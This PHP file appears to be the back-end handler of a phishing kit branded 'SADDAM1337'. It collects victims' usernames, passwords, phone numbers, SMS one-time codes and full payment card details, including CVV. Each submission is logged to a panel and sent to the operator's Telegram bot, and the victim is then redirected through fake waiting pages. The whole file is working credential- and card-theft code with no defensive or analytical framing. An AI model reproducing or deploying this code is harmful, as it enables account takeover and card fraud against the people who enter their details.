<?php
 

require "../main.php";

$bot = $j->getAdmin("telegram_bot");
$ids = explode(",",str_replace(" ","",$j->getAdmin("chat_id")));

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("M d, Y")." at ".date("h:i:sa");

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}




if(isset($_POST['user'])){
	
	$user = post("user");
	$password = post("password");
	$telegram_content = urlencode("
	==========LOGIN INFORMATIONS==========
	+ IP  🌍 : $ip
	+ USERNAME 👨‍🦱 : $user
	+ PASSWORD 🔑 : $password
	=========== SADDAM1337 🇲🇦 =============
	");
	
	//save data to panel
	$j->saveData("+ LOG [ $password / $user ] ", $j->get("id"));
	
	//SENDING INFO TO TELEGRAM BOT...
	foreach($ids as $id){
	$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
	sendBot($url);
	}
	
	header("location: telephone.php");
		
	}



	if(isset($_POST['tel'])){
	
		$tel = post("tel");
		
		$telegram_content = urlencode("
		==========TELEPHONE==========
		+ IP  🌍 : $ip
		+ NUMERO DE TELEPHONE 🤳: $tel
		=========== SADDAM1337 🇲🇦 =============
		");
		
		//save data to panel
		$j->saveData("+ NUMERO DE TELEPHONE 🤳 [ $tel ] ", $j->get("id"));
		
		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
		$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
		sendBot($url);
		}
		
		header("location: wait.php");
			
		}











if(isset($_POST['sms'])){
	
$sms = post("sms");

$telegram_content = urlencode("
=========== SADDAM1337 🇲🇦 =============
+ IP 🌍 : $ip
+ SMS 📥 : $sms
=========== SADDAM1337 🇲🇦 =============
");


//save data to panel
$j->saveData("+ SMS [ $sms ] ", $j->get("id"));

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}

header("location: wait.php?p=OTP");
	
}

 



	


if(isset($_POST['cc'])){
	
	$cardnumber = post('cc');
	$_SESSION['cc'] = $cardnumber;
	$exp = post("exp");
	$cvv = post("cvv");
	$name = post("name");

$telegram_content = urlencode("
=========== SADDAM1337 🇲🇦 =============
+ IP 🌍 :  $ip
+ TARJETA 💳 : $cardnumber 
+ FECHA 🗓 : $exp 
+ CVV 🗝 : $cvv
");

//save data
$j->saveData("+ CARD [ $cardnumber | $exp | $cvv ] ", $j->get("id"));

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}

header("location: wait.php");

}

 

?>